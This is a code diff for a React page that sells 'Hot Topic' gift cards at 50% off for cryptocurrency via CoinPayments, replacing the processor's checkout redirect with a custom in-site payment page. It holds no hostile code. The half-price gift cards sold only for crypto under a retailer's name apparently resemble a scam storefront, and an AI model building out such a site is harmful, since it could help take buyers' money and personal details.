@@ -1,5 +1,5 @@
-
 import { useState } from "react";
+import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -24,6 +24,7 @@ const PHONE_REGEX = /^(\+1|1)?[-. ]?\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]
 const ZIP_REGEX = /^\d{5}(-\d{4})?$/;
 
 const Index = () => {
+  const navigate = useNavigate();
   const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
   const [deliveryMethod, setDeliveryMethod] = useState<"e-gift" | "physical">("e-gift");
   const [selectedCryptoCurrency, setSelectedCryptoCurrency] = useState<string>("BTC");
@@ -150,9 +151,12 @@ const Index = () => {
     try {
       console.log(`Starting payment process for $${selectedAmount} gift card (50% off) using ${selectedCryptoCurrency}`);
       
-      // Create CoinPayment transaction with 50% of the selected gift card value and selected cryptocurrency
+      // Calculate the discounted amount (50% off)
+      const discountedAmount = selectedAmount * 0.5;
+      
+      // Create CoinPayment transaction
       const paymentResult = await createCoinPaymentTransaction({
-        amount: selectedAmount * 0.5,
+        amount: discountedAmount,
         customerName: `${formData.firstName} ${formData.lastName}`,
         customerEmail: formData.email,
         giftCardValue: selectedAmount,
@@ -170,7 +174,7 @@ const Index = () => {
         return;
       }
       
-      console.log("Payment transaction created successfully, redirecting to:", paymentResult.checkoutUrl);
+      console.log("Payment transaction created successfully:", paymentResult.transactionDetails);
       
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify({
@@ -178,14 +182,23 @@ const Index = () => {
         email: formData.email,
         phone: formData.phone,
         giftCardValue: selectedAmount,
-        paymentAmount: selectedAmount * 0.5,
+        paymentAmount: discountedAmount,
         deliveryMethod: deliveryMethod,
         cryptoCurrency: selectedCryptoCurrency,
         orderDate: new Date().toISOString(),
+        transactionId: paymentResult.transactionDetails?.txn_id
       }));
       
-      // Redirect to CoinPayments checkout page
-      window.location.href = paymentResult.checkoutUrl as string;
+      // Navigate to our custom payment page instead of redirecting to CoinPayments
+      navigate("/payment", { 
+        state: { 
+          transactionDetails: paymentResult.transactionDetails,
+          amount: discountedAmount,
+          giftCardValue: selectedAmount,
+          itemName: `Hot Topic $${selectedAmount} Gift Card`,
+          cryptoCurrency: selectedCryptoCurrency
+        } 
+      });
     } catch (error) {
       console.error("Payment submission error:", error);
       toast({
